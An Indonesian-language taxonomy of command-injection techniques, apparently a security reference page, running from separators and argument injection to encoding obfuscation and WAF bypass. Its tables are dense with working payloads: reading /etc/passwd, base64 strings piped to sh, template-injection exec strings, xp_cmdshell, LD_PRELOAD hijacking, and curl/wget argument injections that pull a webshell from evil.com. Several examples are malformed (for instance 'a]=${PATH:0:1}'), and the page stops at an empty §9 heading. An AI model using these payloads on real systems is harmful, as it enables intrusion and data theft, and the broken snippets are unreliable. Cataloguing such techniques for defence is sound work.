---
title: Command Injection
description: Vektor mutasi injeksi command
---

## Struktur Klasifikasi

Command injection (CWE-77/CWE-78) mengeksploitasi batas antara data dan instruksi yang dapat dieksekusi dalam interpreter shell sistem operasi. Kerentanan fundamental muncul ketika aplikasi membangun perintah OS dengan menggabungkan input yang dikontrol pengguna dengan string perintah, kemudian meneruskan hasilnya ke shell untuk diinterpretasikan. Sintaks shell yang kaya—metacharacter, mekanisme expansion, aturan quoting, dan interpolasi environment variable—menyediakan permukaan mutasi yang sangat besar yang dieksploitasi oleh attacker untuk keluar dari konteks data dan masuk ke konteks perintah.

Taxonomi ini mengorganisir seluruh permukaan serangan command injection sepanjang tiga sumbu:

**Sumbu 1 — Injection Vector (Sumbu utama):** Komponen struktural dari interaksi shell yang menjadi target. Ini menentukan *mekanisme* injeksi—apakah attacker mengeksploitasi command separator, fitur shell expansion, argument parsing, transformasi encoding, perilaku API spesifik bahasa, atau konteks deployment pipeline.

**Sumbu 2 — Evasion Type (Sumbu lintas):** Sifat dari bypass defense. Setiap mutasi baik mengelak filter spesifik (character blocklist, pembatasan whitespace, konteks quote) atau mengeksploitasi perbedaan parsing antara layer defense dan interpreter shell. Tipe evasi di bawah ini berlaku di semua kategori Sumbu 1:

| Evasion Type | Mekanisme | Berlaku Untuk |
|---|---|---|
| **Separator Substitution** | Mengganti separator yang diblok (`;`) dengan operator yang setara (`\|`, `&&`, `\|\|`, `&`, `\n`) | §1 |
| **Whitespace Evasion** | Mengganti spasi dengan `$IFS`, `${IFS}`, `$IFS$9`, tab (`%09`), brace expansion, redirection `<` | §1, §4, §6 |
| **Character Encoding Bypass** | Hex (`\x2f`), octal (`\057`), URL encoding (`%0a`), Unicode, base64, ekstraksi substring variable | §6 |
| **Quote Context Escape** | Keluar dari single/double quotes untuk menyuntikkan operator atau substitusi | §1, §3, §6 |
| **Wildcard/Glob Substitution** | Menggunakan `?` dan `*` untuk merekonstruksi nama command atau path yang diblok | §4, §6 |
| **Variable Expansion Bypass** | Memanfaatkan substring `$PATH`, `$HOME`, `$PWD` untuk mengekstrak karakter yang diblok | §5, §6 |
| **Parsing Discrepancy** | Mengeksploitasi perbedaan antara parsing WAF/filter dan interpretasi backend shell (content-type confusion, multipart boundary mutation, header injection) | §8 |
| **Context Termination** | Menghentikan format data yang diharapkan (nilai JSON, atribut XML, template string) sebelum menyuntikkan sintaks shell | §1, §7 |

**Sumbu 3 — Exploitation Scenario (Sumbu pemetaan):** Arsitektur deployment dan metode eksfiltrasi data. Detail di bagian Attack Scenario Mapping (§10).

---

## §1. Command Separator & Chaining Operator Injection

Vector injeksi paling fundamental mengeksploitasi shell metacharacter yang menghentikan satu perintah dan memulai perintah lain. Setiap bahasa shell mendefinisikan set operator kontrol yang, ketika disuntikkan ke input yang tidak disanitasi, memungkinkan attacker untuk menambahkan perintah arbitrer ke perintah aplikasi yang dimaksudkan.

### §1-1. Sequential Execution Separators

Operator-operator ini menyebabkan shell memperlakukan apa yang mengikutinya sebagai perintah baru yang independen.

| Subtype | Operator | Mekanisme | Platform | Contoh |
|---|---|---|---|---|
| **Semicolon separator** | `;` | Menghentikan perintah saat ini, memulai perintah berikutnya. Tidak ada dependensi kondisional. | Linux/macOS | `127.0.0.1; cat /etc/passwd` |
| **Newline separator** | `\n` / `%0a` | Shell menginterpretasikan newline literal sebagai terminator perintah. Sering di-URL-encode sebagai `%0a` atau disuntikkan via CRLF. | Linux/macOS/Windows | `127.0.0.1%0acat%20/etc/passwd` |
| **Null byte termination** | `%00` | Dalam beberapa implementasi legacy, null byte memotong string perintah, memungkinkan perintah kedua setelah validasi level aplikasi. | Sistem legacy | `127.0.0.1%00; whoami` |

### §1-2. Conditional Execution Operators

Operator-operator ini menggabungkan perintah dengan dependensi logis, sering digunakan ketika aplikasi memeriksa keberhasilan/kegagalan perintah.

| Subtype | Operator | Mekanisme | Platform | Contoh |
|---|---|---|---|---|
| **AND operator** | `&&` | Perintah kedua dieksekusi hanya jika yang pertama berhasil (exit code 0). Berguna ketika perintah yang disuntikkan harus mengikuti ping/lookup yang berhasil. | Linux/Windows | `127.0.0.1 && whoami` |
| **OR operator** | `\|\|` | Perintah kedua dieksekusi hanya jika yang pertama gagal. Berguna ketika perintah yang dimaksudkan dirancang untuk gagal atau ketika attacker sengaja menyebabkan kegagalan. | Linux/Windows | `invalidhost \|\| whoami` |

### §1-3. Background & Pipe Operators

| Subtype | Operator | Mekanisme | Platform | Contoh |
|---|---|---|---|---|
| **Background operator** | `&` | Menjalankan perintah sebelumnya di background, segera mengeksekusi perintah berikutnya. Di Windows, `&` bertindak sebagai sequential separator. | Linux (background) / Windows (sequential) | `127.0.0.1 & whoami` |
| **Pipe operator** | `\|` | Meneruskan stdout dari perintah pertama sebagai stdin dari perintah kedua. Perintah kedua selalu dieksekusi terlepas dari keberhasilan perintah pertama. | Linux/Windows | `127.0.0.1 \| whoami` |

### §1-4. Command Substitution as Separator

Command substitution memaksa shell untuk mengeksekusi ekspresi yang tertanam dan menggantinya dengan output, bahkan ketika disuntikkan dalam string yang lebih besar.

| Subtype | Sintaks | Mekanisme | Platform | Contoh |
|---|---|---|---|---|
| **Backtick substitution** | `` `cmd` `` | Shell mengeksekusi konten antara backtick dan mensubstitusi output. Bekerja di dalam double-quoted strings. | Linux/macOS | `` `whoami` `` |
| **Dollar-parentheses substitution** | `$(cmd)` | Bentuk modern dari command substitution. Mendukung nesting: `$($(cmd))`. | Linux/macOS | `$(cat /etc/passwd)` |
| **Dollar-brace arithmetic** | `$(( ))` | Konteks evaluasi aritmatika di bash memungkinkan array indexing dengan command substitution: `a[$(cmd)]`. | Linux (bash) | `$((a[$(whoami)]))` |

---

## §2. Argument & Option Injection

Kelas command injection yang berbeda yang memerlukan *tanpa shell metacharacter*. Ketika aplikasi meneruskan input pengguna sebagai argument ke perintah spesifik (via API aman seperti `execFile` atau `spawn`), input masih dapat diinterpretasikan sebagai command-line flags jika dimulai dengan `-` atau `--`. Ini melewati defense command injection tradisional yang fokus pada filtering metacharacter.

### §2-1. Leading Dash Option Injection

Ketika input yang dikontrol pengguna diteruskan sebagai positional argument tetapi dimulai dengan hyphen, target binary menginterpretasikannya sebagai option flag daripada data.

| Subtype | Target Binary | Exploitable Flag | Dampak | Contoh |
|---|---|---|---|---|
| **Git upload-pack injection** | `git clone` | `--upload-pack="cmd"` | Arbitrary command execution via custom upload-pack binary | `git clone --upload-pack="touch /tmp/pwned" repo` |
| **Git config injection** | `git fetch/diff/log/grep/blame` | `--config=core.sshCommand="cmd"` | Command execution melalui konfigurasi SSH command git | Input pengguna: `--config=core.sshCommand=calc` |
| **SSH ProxyCommand injection** | `ssh` | `-oProxyCommand="cmd"` | Arbitrary command execution sebagai SSH pre-connection hook | `ssh -oProxyCommand="whoami>/tmp/out" host` |
| **Curl output injection** | `curl` | `-o /path/file` | Arbitrary file write (webshell upload) | Input pengguna: `http://evil.com/shell.php  -o /var/www/shell.php` |
| **Tar arbitrary command** | `tar` | `--checkpoint-action=exec=cmd` | Command execution selama pemrosesan archive | `--checkpoint=1 --checkpoint-action=exec=id` |
| **Chromium GPU launcher** | `chrome/chromium` | `--gpu-launcher="cmd"` | Arbitrary command execution via renderer process | `--gpu-launcher="calc.exe"` |
| **Mercurial config injection** | `hg` | `--config=alias.hierarchical=!cmd` | Shell alias execution via configuration override | `--config=alias.hierarchical=!calc` |
| **psql output redirection** | `psql` | `-o'\|cmd'` | Pipe query output melalui perintah arbitrer | `-o'\|id>/tmp/out'` |
| **Sendmail logfile write** | `sendmail` | `-OQueueDirectory=/tmp -X/var/www/shell.php` | Arbitrary file write via log redirection | `-OQueueDirectory=/tmp -X/path/webshell.php` |
| **Zip command execution** | `zip` | `-T --unzip-command="cmd"` | Command execution via custom test command | `-T --unzip-command="sh -c whoami"` |
| **Wget output injection** | `wget` | `-O /path/file` | Arbitrary file write | Input pengguna: `http://evil.com  -O /var/www/shell.php` |

### §2-2. End-of-Options Bypass (`--`)

Konvensi POSIX menggunakan `--` untuk menandakan akhir dari options, setelah itu semua argument diperlakukan sebagai positional. Aplikasi yang gagal memasukkan `--` sebelum input pengguna rentan terhadap serangan §2-1. Mitigasi: `command -- $user_input`.

### §2-3. JVM Argument Injection

Ketika input pengguna mencapai Java command-line arguments, flag JVM spesifik memicu code execution:

| Subtype | Flag | Mekanisme | Kondisi |
|---|---|---|---|
| **OnOutOfMemoryError** | `-XX:OnOutOfMemoryError="cmd"` | JVM mengeksekusi perintah yang ditentukan ketika OOM terjadi. Attacker dapat memaksa OOM via heap exhaustion. | Input pengguna mencapai JVM args |
| **JDWP agent** | `-agentlib:jdwp=transport=dt_socket,server=y` | Membuka debug port untuk remote code execution | Input pengguna mencapai JVM startup args |

---

## §3. Quote & Context Escape Injection

Ketika input pengguna ditempatkan di dalam konteks yang di-quoted (single quotes, double quotes, template literals), attacker harus terlebih dahulu keluar dari konteks tersebut sebelum menyuntikkan command operator.

### §3-1. Single Quote Escape

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Quote termination** | Menyuntikkan `'` untuk menutup konteks single-quote, kemudian menambahkan command operator | `'; whoami; '` |
| **Quote-backslash-quote-quote** | Di bash, `'\''` menghentikan single quote, menyisipkan literal `'` via `\'`, kemudian membuka kembali single quote. Digunakan untuk menyuntikkan dalam konteks single-quoted tanpa merusak sintaks luar. | `input'\''$(whoami)'\''rest` |

### §3-2. Double Quote Escape

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Quote termination** | Menyuntikkan `"` untuk menutup konteks double-quote, kemudian menggabungkan perintah | `"; whoami; "` |
| **Command substitution within quotes** | Double quotes mengizinkan expansion `$()` dan backtick. Jika input ditempatkan dalam double quotes tanpa escaping `$`, command substitution dieksekusi. | `Hello $(whoami)` di dalam `"user_input"` |

### §3-3. Template Literal Escape (JavaScript/Node.js)

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Backtick escape** | Jika input ditempatkan dalam JavaScript template literal (`` `...` ``), menyuntikkan backtick menutup template, memungkinkan code injection. | `` `; process.exit()` `` |
| **Expression interpolation** | `${...}` di dalam template literals mengevaluasi ekspresi JavaScript. Jika input pengguna mencapai template yang diteruskan ke `exec()`, arbitrary code dieksekusi. | `${require('child_process').execSync('whoami')}` |

### §3-4. Context Termination in Structured Formats

Ketika konstruksi perintah melibatkan structured data (JSON, XML, YAML), attacker menghentikan format data sebelum menyuntikkan sintaks shell.

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **JSON value breakout** | Menutup nilai string JSON dan object, kemudian menambahkan perintah shell setelah JSON yang di-parse | `"}}; whoami #` |
| **XML/CDATA breakout** | Menutup XML CDATA atau konteks atribut, menyuntikkan perintah via processing instructions atau entity expansion | `]]>; whoami` |

---

## §4. Shell Expansion & Globbing Exploitation

Shell melakukan multiple expansion pass sebelum mengeksekusi perintah. Setiap tipe expansion menyediakan permukaan mutasi untuk membangun perintah tanpa mengetik karakter yang diblok atau nama perintah secara langsung.

### §4-1. Brace Expansion

Bash mengexpand nilai yang dipisahkan koma dalam braces menjadi kata-kata terpisah. Ini memungkinkan konstruksi perintah tanpa spasi.

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Command-as-brace** | `{cmd,arg1,arg2}` mengexpand menjadi `cmd arg1 arg2`, melewati filter spasi | `{cat,/etc/passwd}` |
| **Sequence expansion** | `{a..z}` menghasilkan urutan karakter; dapat digunakan untuk merekonstruksi karakter yang difilter | `{/,e,t,c,/,p,a,s,s,w,d}` dengan concatenation |

### §4-2. Wildcard & Glob Substitution

Wildcard memungkinkan matching filename tanpa mengetik path lengkap, memungkinkan konstruksi perintah dari entri filesystem.

| Subtype | Mekanisme | Platform | Contoh |
|---|---|---|---|
| **Question mark glob** | `?` cocok dengan karakter tunggal apa pun. Digunakan untuk mengeja binary dari filesystem: `/???/??t /???/??????` → `/bin/cat /etc/passwd` | Linux | `/???/???/??????` → `/usr/bin/whoami` |
| **Asterisk glob** | `*` cocok dengan urutan apa pun. Dikombinasikan dengan partial paths: `/bin/c*t /etc/p*` | Linux/Windows | `/bin/c*t /etc/pass*` |
| **Windows wildcard** | `C:\*\*2\n??e*d.*?` cocok dengan path PowerShell atau cmd melalui wildcard expansion | Windows | `C:\*\*2\n??e*d.*?` |
| **Charset glob** | `[a-z]` cocok dengan rentang karakter. Dapat merekonstruksi nama perintah karakter demi karakter. | Linux | `/bin/[c]at /etc/passwd` |

### §4-3. Tilde Expansion

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Home directory** | `~` mengexpand ke `$HOME`. `~user` mengexpand ke home directory user lain. | `cat ~/.bashrc` |
| **Current directory** | `~+` mengexpand ke `$PWD` | `~+/exploit.sh` |
| **Previous directory** | `~-` mengexpand ke `$OLDPWD` | `~-/exploit.sh` |

### §4-4. Process Substitution

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Input process substitution** | `<(cmd)` membuat named pipe dengan output perintah. Dapat memberi data ke perintah yang mengharapkan file argument. | `diff <(cat /etc/passwd) <(cat /etc/shadow)` |
| **Output process substitution** | `>(cmd)` membuat named pipe sebagai target output | `echo data > >(tee /tmp/exfil)` |

---

## §5. Environment Variable Manipulation

Environment variable adalah sumber karakter, path, dan nilai yang kaya yang dapat dimanfaatkan attacker untuk merekonstruksi perintah yang diblok dan melewati filter.

### §5-1. IFS (Internal Field Separator) Exploitation

Variable `$IFS` default ke space-tab-newline. Ketika spasi diblok, `$IFS` berfungsi sebagai substitusi whitespace universal.

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Basic IFS substitution** | `$IFS` mengexpand ke spasi, memisahkan perintah dari argument | `cat${IFS}/etc/passwd` |
| **IFS with positional** | `$IFS$9` menggabungkan IFS dengan positional parameter ke-9 (biasanya kosong), menghasilkan separator yang lebih bersih | `cat$IFS$9/etc/passwd` |
| **IFS redefinition** | Mengatur `IFS=;` menyebabkan semicolon dalam input selanjutnya diperlakukan sebagai field separator daripada command terminator (penggunaan defensif); sebaliknya, mengatur `IFS` ke nilai lain dapat mengubah parsing | `IFS=,;cmd,arg` |

### §5-2. Variable Substring Extraction

Karakter yang diblok oleh filter dapat diekstrak dari nilai environment variable yang ada.

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Bash substring** | Linux | `${VAR:offset:length}` mengekstrak karakter. `${PATH:0:1}` biasanya menghasilkan `/`. `${HOME:0:1}` menghasilkan `/`. | `cat ${HOME:0:1}etc${HOME:0:1}passwd` |
| **CMD substring** | Windows | `%VAR:~start,length%` mengekstrak karakter. `%PROGRAMFILES:~10,1%` mengekstrak spasi dari "C:\Program Files". | `ping%PROGRAMFILES:~10,1%127.0.0.1` |
| **PowerShell indexing** | Windows | `$env:VAR[index]` mengekstrak karakter. `$env:HOMEPATH[0]` menghasilkan `\`. | `$env:PROGRAMFILES[10]` (spasi) |

### §5-3. Multi-Variable Command Construction

Seluruh perintah dapat dirakit dari fragmen multiple environment variable, menghindari deteksi berbasis pattern.

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Distributed assembly (Linux)** | Linux | Menggabungkan substring: `${PATH:5:1}${HOME:3:1}...` untuk mengeja nama perintah | `a]=${PATH:0:1};${a]}{b}{i}{n}${a]}{c}{a}{t} ${a]}{e}{t}{c}${a]}{p}{a}{s}{s}{w}{d}` |
| **Distributed assembly (Windows)** | Windows | Menggabungkan fragmen `%VAR:~x,y%` di multiple env var | `%PROGRAMFILES:~3,1%%SYSTEMROOT:~4,2%%PROGRAMFILES:~6,1%` → `gri` |

### §5-4. PATH Hijacking & LD_PRELOAD Injection

Ketika aplikasi atau child process mengandalkan unqualified command names, attacker memanipulasi search path.

| Subtype | Mekanisme | Kondisi | Contoh |
|---|---|---|---|
| **PATH prepending** | Mengatur `PATH=/tmp:$PATH` dan menempatkan malicious binary di `/tmp/ls` | Attacker mengontrol environment variable (env injection, `.env` file write) | `export PATH=/tmp:$PATH` kemudian trigger pemanggilan `ls` |
| **LD_PRELOAD injection** | Mengatur `LD_PRELOAD=/path/to/evil.so` untuk hook library function dalam proses yang akan di-spawn berikutnya | Target non-setuid; attacker mengontrol env vars | `LD_PRELOAD=/tmp/evil.so /usr/bin/target` |
| **LD_LIBRARY_PATH** | Mengarahkan shared library search ke direktori yang dikontrol attacker | Target non-setuid | `LD_LIBRARY_PATH=/tmp /usr/bin/target` |
| **PYTHONPATH / NODE_PATH** | Menyuntikkan malicious module dengan prepending ke module path spesifik bahasa | Language runtime menggunakan env-based module resolution | `PYTHONPATH=/tmp python3 target.py` |

---

## §6. Encoding & Character Obfuscation

Kategori ini mencakup teknik yang mentransformasi representasi payload tanpa mengubah makna semantiknya ke shell, melewati defense berbasis signature dan pattern-matching.

### §6-1. Hexadecimal & Octal Encoding

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Echo hex** | Linux | `echo -e "\x63\x61\x74"` decode ke `cat`. Di-pipe ke `sh` atau digunakan via `$()` | `$(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")` |
| **Printf octal** | Linux | `printf '\143\141\164'` decode ke `cat` | `$(printf '\143\141\164\40\57\145\164\143\57\160\141\163\163\167\144')` |
| **xxd reverse** | Linux | `xxd -r -p` mengkonversi hex stream kembali ke binary | `echo 636174202f6574632f706173737764 \| xxd -r -p \| sh` |
| **Dollar-quote ANSI-C** | Linux (bash) | `$'\x63\x61\x74'` menginterpretasikan hex escapes dalam dollar-quoted strings | `$'\x63\x61\x74' $'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'` |

### §6-2. Base64 Encoding

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Base64 decode pipe** | Linux | `echo "payload" \| base64 -d \| sh` | `echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh` |
| **PowerShell encoded command** | Windows | `powershell -EncodedCommand <base64>` menerima perintah yang di-encode UTF-16LE | `powershell -e dwBoAG8AYQBtAGkA` |

### §6-3. URL & Double Encoding

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **URL encoding** | Encoding `%XX` dari metacharacter. `%0a` (newline), `%3b` (semicolon), `%7c` (pipe) | `127.0.0.1%0a%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64` |
| **Double URL encoding** | `%25XX` → decode ke `%XX` → decode ke karakter. Melewati pattern decode-then-filter single-pass | `%250a` → `%0a` → newline |
| **Unicode encoding** | Encoding `%uXXXX` untuk melewati filter ASCII-only | `%u003B` → `;` |

### §6-4. Quote-Based Obfuscation

Menyisipkan quotes dalam nama perintah tidak mengubah eksekusi tetapi merusak signature matching.

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Empty single quotes** | Linux | Pasangan single quotes di-strip oleh shell: `w'h'o'am'i` → `whoami` | `c'a't /e't'c/p'a's's'w'd` |
| **Empty double quotes** | Linux | Prinsip yang sama: `w"h"o"am"i` → `whoami` | `c"a"t /e"t"c/p"a"s"s"w"d` |
| **Backslash insertion** | Linux | Backslash sebelum karakter non-spesial diabaikan: `w\ho\am\i` → `whoami` | `c\at /e\tc/p\as\sw\d` |
| **Caret insertion** | Windows | `^` adalah karakter escape CMD dan di-strip dari perintah: `w^h^o^a^m^i` → `whoami` | `p^o^w^e^r^s^h^e^l^l` |
| **Backtick insertion** | Linux | Backtick berpasangan yang berisi nothing: `` wh``oami `` → `whoami` | `` c``at /e``tc/pa``sswd `` |
| **Dollar-at insertion** | Linux | `$@` mengexpand ke nothing (tidak ada positional parameter): `who$@ami` → `whoami` | `c$@at /etc/passwd` |

### §6-5. Case Manipulation

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Windows case insensitivity** | Windows | CMD dan PowerShell mengabaikan case: `WhOaMi`, `WHOAMI` semua dieksekusi | `wHoAmI` |
| **Bash case conversion** | Linux | `${var^^}` (uppercase) dan `${var,,}` (lowercase) dapat mentransformasi nilai variable yang diobfuscasi ke nama perintah | `a]="WHOAMI";${a],,}` |
| **tr/sed transformation** | Linux | Pipe character transformations: `echo "jdunfhj" \| tr 'a-z' 'b-a'` → shift cipher | `echo "b\x61t" \| tr 'b' 'c'` → `cat` |

### §6-6. String Concatenation & Reassembly

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Variable concatenation** | Linux | `a=c;b=at;$a$b /etc/passwd` | `a=who;b=ami;$a$b` |
| **SET concatenation** | Windows | `set a=who&set b=ami&%a%%b%` | `set a=who&set b=ami&call %a%%b%` |
| **Reversed command** | Linux | `echo "dssap/cte/ tac" \| rev \| sh` | Simpan perintah terbalik, pipe melalui `rev` |
| **Split and reassemble** | Linux/Windows | Memecah perintah di multiple variable/barisan, rekonstruksi saat eksekusi | Multi-line payload dengan `eval` akhir |

### §6-7. Line Continuation & Whitespace Tricks

| Subtype | Platform | Mekanisme | Contoh |
|---|---|---|---|
| **Backslash-newline continuation** | Linux | Backslash di akhir baris melanjutkan ke baris berikutnya, memungkinkan split di tengah kata | `ca\`(newline)`t /et\`(newline)`c/passwd` |
| **Tab substitution** | Linux | Karakter tab (`\t`, `%09`) berfungsi sebagai alternatif whitespace | `cat%09/etc/passwd` |
| **Input redirection as space** | Linux | `<` dapat menggantikan spasi untuk file argument: `cat</etc/passwd` | `cat</etc/passwd` |

---

## §7. Language & Runtime-Specific Injection Sinks

Bahasa pemrograman berbeda mengekspos eksekusi perintah OS melalui berbagai API dengan karakteristik safety yang berbeda. Permukaan injeksi bergantung pada apakah API memanggil shell atau meneruskan argument langsung ke kernel.

### §7-1. Shell-Invoking APIs (Dangerous by Default)

Fungsi-fungsi ini meneruskan seluruh string perintah ke interpreter shell (`/bin/sh -c` di Linux, `cmd /c` di Windows), membuatnya rentan terhadap semua teknik §1–§6 ketika input pengguna digabungkan.

| Bahasa | Fungsi Berbahaya | Shell Digunakan | Catatan |
|---|---|---|---|
| **PHP** | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, backtick operator (`` `cmd` ``) | `/bin/sh -c` | `escapeshellarg()` dan `escapeshellcmd()` memberikan mitigasi parsial tetapi memiliki bypass yang diketahui |
| **Python** | `os.system()`, `os.popen()`, `subprocess.call/run/Popen(shell=True)` | `/bin/sh -c` | `subprocess` dengan `shell=False` (default) aman untuk §1 tetapi rentan terhadap §2 |
| **Ruby** | `system("string")` (single-arg), backticks, `%x{}`, `exec("string")`, `IO.popen()` | `/bin/sh -c` | Bentuk multi-arg `system("cmd", "arg")` menghindari shell |
| **Node.js** | `child_process.exec()`, `child_process.execSync()` | `/bin/sh -c` | Selalu memanggil shell; `execFile` dan `spawn` (default `shell:false`) lebih aman |
| **Java** | `Runtime.exec(String[])` dengan shell eksplisit: `{"sh","-c",input}` | `/bin/sh -c` (eksplisit) | Bentuk single-string `Runtime.exec(String)` TIDAK memanggil shell (tokenisasi pada whitespace), tetapi `Runtime.exec(new String[]{"/bin/sh","-c",input})` secara eksplisit memanggil shell |
| **Perl** | `system("string")`, backticks, `open(FH, "\|cmd")`, `exec("string")` | `/bin/sh -c` | Bentuk list `system("cmd", @args)` melewati shell |
| **Go** | `exec.Command("sh", "-c", input)` | Shell eksplisit | `exec.Command("binary", args...)` aman terhadap §1; programmer harus memilih dengan benar |

### §7-2. PHP-CGI Specific: CVE-2024-4577

Kerentanan kritis dalam PHP yang berjalan dalam mode CGI di Windows. Windows "Best-Fit" character mapping mengkonversi karakter Unicode tertentu (misalnya, soft hyphen `0xAD`) ke equivalent ASCII (`-`), memungkinkan attacker untuk menyuntikkan PHP command-line arguments bahkan ketika aplikasi memfilter ASCII hyphens. Ini memungkinkan injeksi `-d allow_url_include=1 -d auto_prepend_file=php://input` untuk arbitrary code execution.

### §7-3. Safe-by-Default APIs (Vulnerable to §2 Only)

| Bahasa | Fungsi Lebih Aman | Mekanisme | Risiko Residual |
|---|---|---|---|
| **Python** | `subprocess.Popen(["cmd", "arg1", "arg2"])` | Argument diteruskan sebagai array langsung ke `execvp()`, tanpa interpretasi shell | Argument injection (§2) jika input pengguna adalah elemen pertama atau dimulai dengan `-` |
| **Node.js** | `child_process.execFile()`, `spawn()` dengan default `shell: false` | Panggilan `execvp()` langsung | Argument injection (§2); mengatur `shell: true` memperkenalkan kembali semua risiko |
| **Ruby** | `system("cmd", "arg1", "arg2")` (multi-arg) | Panggilan `execvp()` langsung | Argument injection (§2) |
| **Go** | `exec.Command("cmd", "arg1", "arg2")` | Panggilan `execvp()` langsung | Argument injection (§2) |
| **Java** | `ProcessBuilder(List<String>)` | Pembuatan proses langsung | Argument injection (§2) |

### §7-4. Eval-to-Shell Chains

Beberapa path injeksi mencapai perintah OS melalui intermediate code evaluation layer.

| Chain | Mekanisme | Contoh |
|---|---|---|
| **SSTI → OS command** | Server-Side Template Injection mencapai fungsi template yang memanggil system command | Jinja2: `{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}` |
| **Expression injection → shell** | Expression languages (Spring EL, OGNL, MVEL) menyediakan akses OS command | Spring EL: `${T(Runtime).getRuntime().exec("whoami")}` |
| **Deserialization → exec** | Deserialization gadget chain memanggil `Runtime.exec()` atau equivalent | Java: Commons Collections gadget chain → `Runtime.exec()` |
| **SQL injection → xp_cmdshell** | Stored procedure SQL Server `xp_cmdshell` mengeksekusi perintah OS | `'; EXEC xp_cmdshell 'whoami'; --` |

### §7-5. Windows Batch/CMD Argument Escaping Bypass (BatBadBut)

Kelas kerentanan (CERT VU#123335) di mana API "Safe-by-Default" §7-3 menjadi eksploitable di Windows. Ketika array-based process creation API memanggil file `.bat` atau `.cmd`, Windows secara implisit memanggil `cmd.exe` untuk menangani batch file. Language runtime meng-escape argument menggunakan konvensi backslash (dirancang untuk `execvp()`), tetapi `cmd.exe` menggunakan caret (`^`) sebagai karakter escape-nya — menciptakan parsing discrepancy yang memungkinkan argument injection yang meningkat ke arbitrary command execution.

| Bahasa | API Terdampak | Status Patch | CVE |
|---|---|---|---|
| **Rust** | `std::process::Command` | Patched | CVE-2024-24576 (CVSS 10.0) |
| **Node.js** | `child_process.spawn/execFile` | Patched | — |
| **PHP** | `proc_open` (array form) | Patched | — |
| **Haskell** | `process` library | Patched | — |
| **Python** | `subprocess.Popen(shell=False)` | Hanya update dokumentasi | — |
| **Ruby** | `system("cmd", "arg")` (multi-arg) | Hanya update dokumentasi | — |
| **Go** | `exec.Command` | Hanya update dokumentasi | — |
| **Java** | `ProcessBuilder` | Won't fix | — |
| **Erlang** | `os:cmd` | Hanya update dokumentasi | — |

**Kondisi eksploitasi:** Aplikasi harus (1) berjalan di Windows, (2) memanggil file `.bat`/`.cmd` — atau menghilangkan extension sementara `.bat` dengan nama yang sama ada di `PATHEXT` — via API array-based, dan (3) meneruskan input yang dikontrol pengguna sebagai argument. Bahkan escaping caret yang naif dapat di-bypass via ekstraksi substring variable `%CMDCMDLINE%` dari `cmd.exe`, yang merekonstruksi karakter yang tidak di-escape saat runtime.

---

## §8. WAF & Filter Bypass via Parsing Discrepancy

Di luar obfuscation level payload (§6), attacker dapat memanipulasi *struktur request* untuk menyebabkan WAF mem-parse request secara berbeda dari aplikasi backend, memungkinkan payload yang tidak dimodifikasi untuk melewati WAF sambil diinterpretasikan dengan benar oleh aplikasi.

### §8-1. Content-Type Confusion

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Multipart boundary mutation** | Memodifikasi karakter boundary multipart/form-data (menambahkan whitespace, quotes, atau karakter spesial) menyebabkan WAF salah mem-parse body boundary sementara backend framework menanganinya dengan benar | Boundary dengan embedded CRLF atau extra whitespace |
| **JSON structural mutation** | Menambahkan duplicate keys, Unicode escapes dalam nama key, atau struktur nested menyebabkan WAF mengevaluasi nilai yang berbeda dari parser backend | `{"cmd":"safe", "cmd": "127.0.0.1; whoami"}` |
| **XML namespace injection** | Menambahkan XML namespaces atau processing instructions menyebabkan WAF melewati konten yang diproses oleh XML parser backend | CDATA sections dengan command payload |
| **Content-Type mismatch** | Mengirim body dengan satu Content-Type sementara backend framework menerima yang lain (misalnya, WAF mengharapkan `application/json`, backend auto-detects `multipart/form-data`) | Content-Type header yang tidak cocok |

### §8-2. Header-Based Injection

| Subtype | Mekanisme | Contoh |
|---|---|---|
| **Non-standard header injection** | WAF terutama memeriksa URL parameter dan POST body. Payload dalam `User-Agent`, `Referer`, `X-Forwarded-For`, atau custom header dapat melewati inspeksi sambil dikonsumsi oleh backend logging atau fungsi pemrosesan | `User-Agent: ; cat /etc/passwd` ketika UA di-log via shell |
| **CRLF header injection** | Menyuntikkan `\r\n` ke dalam nilai header untuk menambahkan header tambahan atau memulai HTTP request baru, berpotensi mencapai endpoint backend yang berbeda | `\r\nX-Injected: malicious_value` |

### §8-3. Request Structure Mutation (Teknik WAFFLED)

Penelitian mendemonstrasikan 1,207 bypass di AWS WAF, Azure WAF, Cloud Armor, Cloudflare, dan ModSecurity dengan memutasi elemen non-payload dari HTTP request. Target mutasi utama meliputi:

| Subtype | Mekanisme | WAF Terdampak |
|---|---|---|
| **Multipart field ordering** | Mengurutkan ulang field multipart untuk menempatkan payload setelah inspection window WAF | AWS, Cloudflare |
| **Charset declaration** | Mendeklarasikan charset yang tidak biasa dalam Content-Type menyebabkan WAF salah menginterpretasikan body encoding | ModSecurity, Cloud Armor |
| **Chunked encoding** | Menggunakan Transfer-Encoding: chunked untuk memecah payload di beberapa chunk | Multiple WAFs |
| **Duplicate parameters** | HTTP Parameter Pollution (HPP): mengirim parameter yang sama beberapa kali dengan payload dalam instance yang tidak diinspeksi WAF | Backend-dependent |

---

## §9. CI/CD & Pipeline Command Injection

